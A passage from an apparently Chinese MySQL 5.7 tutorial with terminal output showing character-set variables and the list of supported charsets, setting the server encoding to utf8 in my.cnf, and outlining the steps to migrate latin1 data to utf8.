utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">| character_set_connection | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_database&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_filesystem | binary&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_results&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">| character_set_server&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_system&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_sets_dir&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | /usr/local/mysql57/share/charsets/ |</span><br><span class="line">+<span class="comment">--------------------------+------------------------------------+</span></span><br><span class="line">8 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="built_in">character</span> <span class="keyword">set</span>;</span><br><span class="line">+<span class="comment">----------+---------------------------------+---------------------+--------+</span></span><br><span class="line">| Charset&#xA0; | Description&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Default collation&#xA0;&#xA0; | Maxlen |</span><br><span class="line">+<span class="comment">----------+---------------------------------+---------------------+--------+</span></span><br><span class="line">| big5&#xA0;&#xA0;&#xA0;&#xA0; | Big5 Traditional Chinese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | big5_chinese_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 |</span><br><span class="line">| dec8&#xA0;&#xA0;&#xA0;&#xA0; | DEC West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | dec8_swedish_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| cp850&#xA0;&#xA0;&#xA0; | DOS West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp850_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| hp8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | HP West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | hp8_english_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| koi8r&#xA0;&#xA0;&#xA0; | KOI8-R Relcom Russian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | koi8r_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| latin1&#xA0;&#xA0; | cp1252 West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | latin1_swedish_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| latin2&#xA0;&#xA0; | ISO 8859-2 Central European&#xA0;&#xA0;&#xA0;&#xA0; | latin2_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| swe7&#xA0;&#xA0;&#xA0;&#xA0; | 7bit Swedish&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | swe7_swedish_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| ascii&#xA0;&#xA0;&#xA0; | US ASCII&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | ascii_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| ujis&#xA0;&#xA0;&#xA0;&#xA0; | EUC-JP Japanese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | ujis_japanese_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 3 |</span><br><span class="line">| sjis&#xA0;&#xA0;&#xA0;&#xA0; | Shift-JIS Japanese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | sjis_japanese_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 |</span><br><span class="line">| hebrew&#xA0;&#xA0; | ISO 8859-8 Hebrew&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | hebrew_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| tis620&#xA0;&#xA0; | TIS620 Thai&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;| tis620_thai_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| euckr&#xA0;&#xA0;&#xA0; | EUC-KR Korean&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | euckr_korean_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 |</span><br><span class="line">| koi8u&#xA0;&#xA0;&#xA0; | KOI8-U Ukrainian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | koi8u_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| gb2312&#xA0;&#xA0; | GB2312 Simplified Chinese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | gb2312_chinese_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 |</span><br><span class="line">| greek&#xA0;&#xA0;&#xA0; | ISO 8859-7 Greek&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | greek_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| cp1250&#xA0;&#xA0; | Windows Central European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp1250_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| gbk&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | GBK Simplified Chinese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | gbk_chinese_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 |</span><br><span class="line">| latin5&#xA0;&#xA0; | ISO 8859-9 Turkish&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | latin5_turkish_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| armscii8 | ARMSCII-8 Armenian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | armscii8_general_ci |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| utf8&#xA0;&#xA0;&#xA0;&#xA0; | UTF-8 Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | utf8_general_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 3 |</span><br><span class="line">| ucs2&#xA0;&#xA0;&#xA0;&#xA0; | UCS-2 Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | ucs2_general_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 |</span><br><span class="line">| cp866&#xA0;&#xA0;&#xA0; | DOS Russian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp866_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| keybcs2&#xA0; | DOS Kamenicky Czech-Slovak&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | keybcs2_general_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| macce&#xA0;&#xA0;&#xA0; | Mac Central European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;| macce_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| macroman | Mac West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | macroman_general_ci |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| cp852&#xA0;&#xA0;&#xA0; | DOS Central European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp852_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| latin7&#xA0;&#xA0; | ISO 8859-13 Baltic&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | latin7_general_ci&#xA0; &#xA0;|&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| utf8mb4&#xA0; | UTF-8 Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | utf8mb4_general_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 |</span><br><span class="line">| cp1251&#xA0;&#xA0; | Windows Cyrillic&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp1251_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| utf16&#xA0;&#xA0;&#xA0; | UTF-16 Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | utf16_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 |</span><br><span class="line">| utf16le &#xA0;| UTF-16LE Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | utf16le_general_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 |</span><br><span class="line">| cp1256&#xA0;&#xA0; | Windows Arabic&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp1256_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| cp1257&#xA0;&#xA0; | Windows Baltic&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp1257_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| utf32&#xA0;&#xA0;&#xA0; | UTF-32 Unicode&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;| utf32_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 |</span><br><span class="line">| binary&#xA0;&#xA0; | Binary pseudo charset&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | binary&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| geostd8&#xA0; | GEOSTD8 Georgian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | geostd8_general_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 |</span><br><span class="line">| cp932&#xA0;&#xA0;&#xA0; | SJIS for Windows Japanese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp932_japanese_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 |</span><br><span class="line">| eucjpms&#xA0; | UJIS for Windows Japanese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | eucjpms_japanese_ci |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 3 |</span><br><span class="line">| gb18030&#xA0; | China National Standard GB18030 | gb18030_chinese_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 |</span><br><span class="line">+<span class="comment">----------+---------------------------------+---------------------+--------+</span></span><br><span class="line">41 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">**&#x6539;&#x5B57;&#x7B26;&#x7F16;&#x7801;**</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>shell </span><br><span class="line">[root@jaking ~]<span class="comment"># echo character_set_server=utf8 &gt;&gt; /etc/my.cnf</span></span><br><span class="line">[root@jaking ~]<span class="comment"># cat /etc/my.cnf</span></span><br><span class="line">[<span class="keyword">client</span>]</span><br><span class="line">port=<span class="number">3306</span></span><br><span class="line">socket=/<span class="keyword">data</span>/mysql/mysql.sock</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line"><span class="built_in">character</span>-<span class="keyword">set</span>-<span class="keyword">server</span>=utf8</span><br><span class="line"><span class="keyword">collation</span>-<span class="keyword">server</span>=utf8_general_ci</span><br><span class="line"> </span><br><span class="line"><span class="keyword">skip</span>-<span class="keyword">name</span>-resolve</span><br><span class="line"><span class="keyword">user</span>=mysql</span><br><span class="line">port=<span class="number">3306</span></span><br><span class="line">basedir=/usr/<span class="keyword">local</span>/mysql57</span><br><span class="line">datadir=/<span class="keyword">data</span>/mysql</span><br><span class="line">tmpdir=/tmp</span><br><span class="line">socket=/<span class="keyword">data</span>/mysql/mysql.sock</span><br><span class="line"> </span><br><span class="line"><span class="keyword">log</span>-<span class="keyword">error</span>=/<span class="keyword">data</span>/mysql/mysqld.log</span><br><span class="line">pid-<span class="keyword">file</span>=/<span class="keyword">data</span>/mysql/mysqld.pid </span><br><span class="line"><span class="keyword">default</span>-<span class="keyword">storage</span>-<span class="keyword">engine</span>=<span class="keyword">InnoDB</span></span><br><span class="line">character_set_server=utf8</span><br><span class="line">[root@jaking ~]<span class="comment"># systemctl restart mysqld</span></span><br><span class="line">[root@jaking ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql: [<span class="keyword">Warning</span>] <span class="keyword">Using</span> a <span class="keyword">password</span> <span class="keyword">on</span> the command line <span class="keyword">interface</span> can be insecure.</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.&#xA0; Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 4</span><br><span class="line">Server version: 5.7.19 Source distribution</span><br><span class="line"> </span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"> </span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"> </span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &apos;character_set%&apos;;</span><br><span class="line">+<span class="comment">--------------------------+------------------------------------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">--------------------------+------------------------------------+</span></span><br><span class="line">| character_set_client&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_connection | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_database&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">| character_set_filesystem | binary&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_results&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_server&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| character_set_system&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">| character_sets_dir&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | /usr/local/mysql57/share/charsets/ |</span><br><span class="line">+<span class="comment">--------------------------+------------------------------------+</span></span><br><span class="line">8 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">create</span> <span class="keyword">database</span> testdb;     </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show create database testdb;</span><br><span class="line">+<span class="comment">----------+-----------------------------------------------------------------+</span></span><br><span class="line">| Database | <span class="keyword">Create</span> <span class="keyword">Database</span>                                                 |</span><br><span class="line">+<span class="comment">----------+-----------------------------------------------------------------+</span></span><br><span class="line">| testdb   | <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="string">`testdb`</span> <span class="comment">/*!40100 DEFAULT CHARACTER SET utf8 */</span> |</span><br><span class="line">+<span class="comment">----------+-----------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p><strong>6&#xFF1A;&#x5B9E;&#x6218;&#xFF1A;&#x8FC1;&#x79FB;&#x6570;&#x636E;</strong></p><p> &#x80CC;&#x666F;&#xFF1A;&#x516C;&#x53F8;&#x4E1A;&#x52A1;&#x6570;&#x636E;book,&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x5EFA;&#x8868;&#x6CA1;&#x6CE8;&#x610F;&#x5B57;&#x7B26;&#x96C6;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5BFC;&#x81F4;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#xFF1B;&#x73B0;&#x5728;&#x8981;&#x5C06;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x636E;&#x548C;&#x73B0;&#x5728;&#x6570;&#x636E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x4E00;&#x81F4;&#xFF0C;&#x4E0D;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#x60C5;&#x51B5;&#xFF1B;&#x5C06;&#x5B57;&#x7B26;&#x96C6;&#x4E3A;latin1&#x5DF2;&#x6709;&#x8BB0;&#x5F55;&#x7684;&#x6570;&#x636E;&#x8F6C;&#x6210;utf8&#xFF0C;&#x5E76;&#x4E14;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x7684;&#x8BB0;&#x5F55;&#x4E0D;&#x4E71;&#x7801;</p><p>&#x6B65;&#x9AA4;<br>                 1&#xFF1A;&#x5EFA;&#x5E93;&#x53CA;&#x5EFA;&#x8868;&#x7684;&#x8BED;&#x53E5;&#x5BFC;&#x51FA;&#xFF0C;sed&#x6279;&#x91CF;&#x4FEE;&#x6539;&#x4E3A;utf8<br>                 2&#xFF1A;&#x5BFC;&#x51FA;&#x4E4B;&#x524D;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;<br>                 3&#xFF1A;&#x4FEE;&#x6539;mysql&#x670D;&#x52A1;&#x7AEF;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x7F16;&#x7801;&#x4E3A;utf8<br>                 4&#xFF1A;&#x5220;&#x9664;&#x539F;&#x6709;&#x7684;&#x5E93;&#x8868;&#x53CA;&#x6570;&#x636E;<br>                 5&#xFF1A;&#x5BFC;&#x5165;&#x65B0;&#x7684;&#x5EFA;&#x5E93;&#x53CA;&#x5EFA;&#x8868;&#x8BED;&#x53E5;<br>                 6&#xFF1A;&#x5BFC;&#x5165;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x636E;</p><p> 